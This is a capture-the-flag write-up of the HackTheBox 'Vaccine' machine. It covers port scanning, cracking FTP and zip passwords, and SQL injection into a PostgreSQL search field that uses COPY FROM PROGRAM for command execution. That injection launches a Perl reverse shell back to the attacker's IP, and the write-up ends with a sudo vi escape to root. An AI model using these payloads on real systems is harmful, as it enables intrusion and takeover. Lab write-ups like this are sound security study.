---
description: Vaccine box from HackTheBox write up.
---

# Vaccine

## nmap scan

Let's start as always with a `nmap` scan:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- <MACHINE_IP>
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 15:47 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.053s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.16 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p21,22,80 -sC -sV <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 15:49 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
```

So FTP, SSH and an web server. Let's see that web.

## Port 80

A login page, i tried some basic SQL injections payload and some old credentials from previous challenges but no luck. I want to check `gobuster` to check if we can find something interesting apart from the login form.

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<MACHINE_IP>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/09/01 15:58:59 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2312]
/dashboard.php        (Status: 302) [Size: 931] [--> index.php]
===============================================================
2021/09/01 16:06:00 Finished
===============================================================
```

A dashboard, but only accesible after login sadly.

## Port 21

Looks like in the Oopsie machine we can find the credentials we need under `/root/.config/filezilla/filezilla.xml`. Using the credentials `ftpuser:mc@F1l3ZilL4` found in that file we are able to login to the FTP client. 

In the FTP client we can find a backup file protected with a password that can be cracked using `john` and Rockyou as the wordlist. The password is `741852963`.

Inside the protected `zip` file we find an `index.php` where the admin credentials for the website can be found: `admin:2cb42f8734ea607eefed3b70af13bbd3`. The password is `md5` hashed, in this case we can use `https://crackstation.net/`  to get the plain text password: `qwerty789`.

## Admin Dashboard

After login to the admin dashboard with the credentials found in the FTP server, we can see a car list. The search field is SQL injectable so let's get some extra information from the database.

```sql
123'union select '1', '2', '3', version(), '5' -- -
```

That code returned: `PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit`

After getting that the database is Postgres we can check if we have access to the COPY TO/FROM PROGRAM functionality:

```sql
123'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';  -- -

123'union select '1', '2', '3', '4', cmd_output from cmd_exec -- -
```

After that i was able to get: `uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)` so we have RCE cool. Let's try to get a shell, after try and error this looks like worked!

```sql
123'; COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<MY_IP>:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';  -- -
```

## In the box

The reverse shell dies after some seconds of inactivity, what is annoying but is what we have right now. In `/var/www/html/dashboard.php` i found this line: `$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");` and looks like the database password is the same for the system account so we have `ssh`access now (Thanks god because the reverse shell stability was killing me).

Look's like the `postgres`user can execute `vi` as `root`:

```bash
postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
sudo -l
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside `vi` we can execute commands so once we execute `/bin/vi /etc/postgresql/11/main/pg_hba.conf` we can just `!bash` to get a `root` shell. About the root flag, it is in `/root/root.txt`.
